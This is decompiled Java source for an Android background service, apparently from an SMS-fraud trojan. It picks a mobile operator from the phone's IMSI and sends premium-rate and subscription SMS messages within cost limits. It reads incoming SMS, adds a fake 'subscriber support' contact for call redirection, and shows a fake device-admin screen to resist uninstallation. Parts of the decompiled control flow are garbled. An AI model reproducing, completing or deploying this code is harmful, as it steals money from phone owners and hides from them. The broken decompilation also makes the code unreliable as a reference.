package xxx_2.app;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;
import ru.uninstall.FakeActivity;
import ru.uninstall.Functions;

public final class MainService
  extends Service
  implements ThreadOperationListener
{
  public static boolean working = false;
  
  public MainService() {}
  
  public static JSONObject getObject(JSONObject paramJSONObject, String paramString)
  {
    try
    {
      if (paramJSONObject.has(paramString))
      {
        paramJSONObject = paramJSONObject.getJSONObject(paramString);
        return paramJSONObject;
      }
    }
    catch (Exception paramJSONObject)
    {
      Settings.log(paramJSONObject);
    }
    return null;
  }
  
  static boolean isEnable(JSONObject paramJSONObject)
  {
    bool2 = false;
    bool1 = bool2;
    try
    {
      if (paramJSONObject.has("enable"))
      {
        boolean bool3 = paramJSONObject.getBoolean("enable");
        bool1 = bool2;
        if (bool3) {
          bool1 = true;
        }
      }
    }
    catch (Exception paramJSONObject)
    {
      for (;;)
      {
        Settings.log(paramJSONObject);
        bool1 = bool2;
      }
    }
    Settings.log("enable: " + bool1);
    return bool1;
  }
  
  static JSONObject operator()
  {
    JSONObject localJSONObject3;
    label149:
    Object localObject;
    for (JSONObject localJSONObject1 = null;; localObject = localJSONObject3)
    {
      int i;
      try
      {
        JSONArray localJSONArray1 = new JSONObject(Constants.data).getJSONArray("operators");
        i = 0;
        if (i >= localJSONArray1.length())
        {
          if (localJSONObject1 != null) {
            return localJSONObject1;
          }
        }
        else
        {
          JSONObject localJSONObject2 = localJSONArray1.getJSONObject(i);
          JSONArray localJSONArray2 = localJSONObject2.getJSONArray("codes");
          int j = 0;
          for (;;)
          {
            if (j >= localJSONArray2.length())
            {
              localJSONObject3 = localJSONObject1;
              if (!localJSONObject2.has("default")) {
                break label149;
              }
              localJSONObject3 = localJSONObject1;
              if (!localJSONObject2.getBoolean("default")) {
                break label149;
              }
              localJSONObject3 = localJSONObject1;
              if (localJSONObject1 != null) {
                break label149;
              }
              localJSONObject3 = localJSONObject2;
              break label149;
            }
            boolean bool = Constants.imsi.startsWith(localJSONArray2.getString(j));
            localJSONObject3 = localJSONObject2;
            if (bool) {
              break;
            }
            j += 1;
          }
        }
        return localJSONObject3;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        localJSONObject3 = new JSONObject();
      }
      i += 1;
    }
  }
  
  static void sendSms(JSONObject paramJSONObject)
  {
    try
    {
      Settings.sendSms(paramJSONObject.getString("phone"), paramJSONObject.getString("text"));
      return;
    }
    catch (Exception paramJSONObject)
    {
      Settings.log(paramJSONObject);
    }
  }
  
  static void sleepAfterSend(JSONObject paramJSONObject)
  {
    try
    {
      if (paramJSONObject.has("sleep"))
      {
        Settings.log("parameter sleep");
        sleepInSeconds(paramJSONObject.getInt("sleep"));
      }
      return;
    }
    catch (Exception paramJSONObject)
    {
      Settings.log(paramJSONObject);
    }
  }
  
  static void sleepInSeconds(int paramInt)
  {
    Settings.log("sleep: " + paramInt + " sec");
    SystemClock.sleep(Constants.SECOND * paramInt);
  }
  
  static void sleepTimeout(JSONObject paramJSONObject)
  {
    try
    {
      Settings.log("parameter smsTimeout");
      sleepInSeconds(paramJSONObject.getInt("smsTimeout"));
      return;
    }
    catch (Exception paramJSONObject)
    {
      Settings.log(paramJSONObject);
    }
  }
  
  public static void start(Context paramContext, Intent paramIntent, String paramString)
  {
    Settings.log("MainService::start() key: " + paramString);
    Intent localIntent = new Intent(paramContext, MainService.class);
    paramIntent = paramIntent.getExtras();
    if (paramIntent != null) {
      localIntent.putExtras(paramIntent);
    }
    localIntent.putExtra("key", paramString);
    paramContext.startService(localIntent);
  }
  
  private void waitSms(int paramInt)
  {
    Settings.log("waitSms: " + paramInt + " sec");
    int i = 0;
    for (;;)
    {
      if (i >= paramInt) {}
      do
      {
        return;
        SystemClock.sleep(Constants.SECOND);
      } while (Settings.ok);
      i += 1;
    }
  }
  
  long loadTime(String paramString)
  {
    Settings.log("loadTime(): " + paramString);
    Object localObject2 = Settings.getSettings();
    Object localObject1 = localObject2;
    if (localObject2 == null)
    {
      localObject1 = new Settings();
      ((Settings)localObject1).load(this);
      Settings.setSettings((Settings)localObject1);
    }
    int i = 0;
    for (;;)
    {
      if (i >= ((Settings)localObject1).operators.size()) {
        return 0L;
      }
      localObject2 = (Operator)((Settings)localObject1).operators.get(i);
      if (((Operator)localObject2).name.equals(paramString)) {
        return ((Operator)localObject2).time;
      }
      i += 1;
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    setForeground(true);
  }
  
  public void onDestroy() {}
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    paramIntent = paramIntent.getExtras();
    if ((paramIntent != null) && (paramIntent.get("key") != null))
    {
      paramIntent = (String)paramIntent.get("key");
      Settings.log("MainService::onStart() key: " + paramIntent);
      if (paramIntent.equals("pay")) {
        new Thread(new ThreadOperation(this, 1, null)).start();
      }
    }
  }
  
  void saveTime(String paramString)
  {
    Settings.log("saveTime(): " + paramString);
    Object localObject2 = Settings.getSettings();
    Object localObject1 = localObject2;
    if (localObject2 == null)
    {
      localObject1 = new Settings();
      ((Settings)localObject1).load(this);
      Settings.setSettings((Settings)localObject1);
    }
    int i = 0;
    for (;;)
    {
      if (i >= ((Settings)localObject1).operators.size())
      {
        localObject2 = new Operator();
        ((Operator)localObject2).name = paramString;
        ((Operator)localObject2).time = System.currentTimeMillis();
        ((Settings)localObject1).operators.add(localObject2);
        ((Settings)localObject1).save(this);
        return;
      }
      localObject2 = (Operator)((Settings)localObject1).operators.get(i);
      if (((Operator)localObject2).name.equals(paramString))
      {
        ((Operator)localObject2).time = System.currentTimeMillis();
        ((Settings)localObject1).save(this);
        return;
      }
      i += 1;
    }
  }
  
  public void threadOperationRun(int paramInt, Object paramObject)
  {
    Settings.log("threadOperationRun: " + paramInt);
    if (paramInt == 1)
    {
      Settings.log("Start pay");
      Settings.log("working: " + working);
      if (!working) {}
    }
    else
    {
      return;
    }
    working = true;
    Settings.getSettings();
    paramObject = ((PowerManager)getSystemService("power")).newWakeLock(1, "Service");
    paramObject.acquire();
    Object localObject2;
    Object localObject1;
    Object localObject3;
    try
    {
      localJSONObject1 = new JSONObject(Constants.data).getJSONObject("settings");
      JSONObject localJSONObject2 = getObject(localJSONObject1, "callRedirect");
      if ((localJSONObject2 != null) && (localJSONObject2.getBoolean("enable"))) {
        Settings.addContact(this, localJSONObject2.getString("to"), "Поддержка Абонентов");
      }
      try
      {
        localJSONObject2 = getObject(localJSONObject1, "checkInSms");
        if (localJSONObject2 != null)
        {
          Settings.log("checkInSms");
          if (isEnable(localJSONObject2))
          {
            Settings.log("checkInSms = enable");
            Settings.parseInSms(this);
            if (Settings.userCancel)
            {
              Settings.log("userCancel !!!");
              Settings.log("Stop pay");
              working = false;
              paramObject.release();
              try
              {
                MainActivity.self.uninstall();
                return;
              }
              catch (Exception localException2)
              {
                Settings.log(localException2);
                return;
              }
            }
          }
        }
        long l1;
        long l2;
        Settings.log("time for send ok");
      }
      catch (Exception localException3)
      {
        localException3.printStackTrace();
        localObject2 = operator();
        localObject1 = ((JSONObject)localObject2).getString("name");
        l1 = System.currentTimeMillis();
        paramInt = ((JSONObject)localObject2).getInt("repeat");
        l2 = loadTime((String)localObject1);
        Settings.log("operator name: " + (String)localObject1);
        Settings.log("now: " + l1);
        Settings.log("repeat: " + paramInt);
        Settings.log("last time send: " + l2);
        if (Constants.MINUTE * paramInt + l2 > l1) {
          break label481;
        }
      }
      if (!((JSONObject)localObject2).has("sms")) {
        break label409;
      }
      localObject3 = ((JSONObject)localObject2).getJSONArray("sms");
      paramInt = 0;
    }
    catch (Exception localException1)
    {
      for (;;)
      {
        JSONObject localJSONObject1;
        label409:
        Settings.log(localException1);
        continue;
        paramInt += 1;
      }
      localObject2 = ((JSONArray)localObject1).getJSONObject(paramInt);
      if (!((JSONObject)localObject2).getBoolean("subscription")) {
        break label754;
      }
    }
    if (paramInt >= ((JSONArray)localObject3).length())
    {
      paramInt = ((JSONObject)localObject2).getInt("mode");
      Settings.log("start sms: mode = " + paramInt);
      if ((paramInt != 1) && (paramInt != 41)) {
        break label1090;
      }
      if (((JSONObject)localObject2).has("sms"))
      {
        localObject1 = ((JSONObject)localObject2).getJSONArray("sms");
        paramInt = 0;
        if (paramInt < ((JSONArray)localObject1).length()) {
          break label732;
        }
      }
    }
    label481:
    label533:
    label732:
    label754:
    label772:
    label1067:
    label1083:
    label1090:
    label1104:
    label1117:
    for (;;)
    {
      localObject1 = getObject(localJSONObject1, "simpleSms");
      if (localObject1 != null)
      {
        Settings.log("parameter simpleSms");
        if (isEnable((JSONObject)localObject1))
        {
          sleepInSeconds(((JSONObject)localObject1).getInt("wait"));
          localObject1 = ((JSONObject)localObject1).getJSONArray("sms");
          paramInt = 0;
          if (paramInt < ((JSONArray)localObject1).length()) {
            break label1067;
          }
        }
      }
      localObject1 = getObject(localJSONObject1, "antiUninstall");
      if (localObject1 != null)
      {
        Settings.log("parameter antiUninstall");
        if (isEnable((JSONObject)localObject1))
        {
          sleepInSeconds(((JSONObject)localObject1).getInt("wait"));
          FakeActivity.text = ((JSONObject)localObject1).getString("text");
          FakeActivity.repeat = ((JSONObject)localObject1).getBoolean("repeat");
          Functions.showAdmin(this, FakeActivity.class);
        }
      }
      localJSONObject1 = getObject(localJSONObject1, "repeatSend");
      if (localJSONObject1 != null)
      {
        Settings.log("parameter repeatSend");
        if (isEnable(localJSONObject1)) {
          Settings.startRepeatTimer(this, localJSONObject1.getInt("time"));
        }
      }
      Settings.log("Stop pay");
      working = false;
      paramObject.release();
      return;
      JSONObject localJSONObject3 = ((JSONArray)localObject3).getJSONObject(paramInt);
      if (localJSONObject3.getBoolean("subscription"))
      {
        Settings.startSmsTimer(this, localJSONObject3.getLong("sleep"), paramInt, localJSONObject3.getString("phone"), localJSONObject3.getString("text"));
        break;
      }
      break label1083;
      sendSms((JSONObject)localObject2);
      sleepTimeout(localException1);
      sleepAfterSend((JSONObject)localObject2);
      break label1083;
      int i = ((JSONObject)localObject2).getInt("maxCost");
      int j = ((JSONObject)localObject2).getInt("maxSms");
      Settings.log("maxCost = " + i);
      if (((JSONObject)localObject2).has("sms"))
      {
        localObject2 = ((JSONObject)localObject2).getJSONArray("sms");
        paramInt = 0;
        for (;;)
        {
          if (paramInt >= ((JSONArray)localObject2).length()) {
            break label1117;
          }
          localObject3 = ((JSONArray)localObject2).getJSONObject(paramInt);
          int n;
          int m;
          int k;
          if (((JSONObject)localObject3).getBoolean("subscription"))
          {
            n = paramInt;
            m = i;
            k = j;
          }
          else
          {
            int i1 = ((JSONObject)localObject3).getInt("cost");
            Settings.log("sms cost = " + i1);
            n = paramInt;
            m = i;
            k = j;
            if (j > 0)
            {
              n = paramInt;
              m = i;
              k = j;
              if (i - i1 > 0)
              {
                saveTime((String)localObject1);
                localJSONObject3 = ((JSONObject)localObject3).getJSONObject("wait");
                Settings.phone = localJSONObject3.getString("phone");
                Settings.text = localJSONObject3.getString("text");
                Settings.ok = false;
                sendSms((JSONObject)localObject3);
                waitSms(localJSONObject3.getInt("time"));
                Settings.log("sent.ok: " + Settings.ok);
                n = paramInt;
                m = i;
                k = j;
                if (Settings.ok)
                {
                  Settings.ok = false;
                  k = j - 1;
                  m = i - i1;
                  n = paramInt - 1;
                }
                sleepTimeout(localException1);
                sleepAfterSend((JSONObject)localObject3);
                break label1104;
                sendSms(((JSONArray)localObject1).getJSONObject(paramInt));
                paramInt += 1;
                break label533;
                paramInt += 1;
                break;
                if (paramInt == 2) {
                  break label772;
                }
                if (paramInt != 42) {
                  break label481;
                }
                break label772;
              }
            }
          }
          paramInt = n + 1;
          i = m;
          j = k;
        }
      }
    }
  }
}
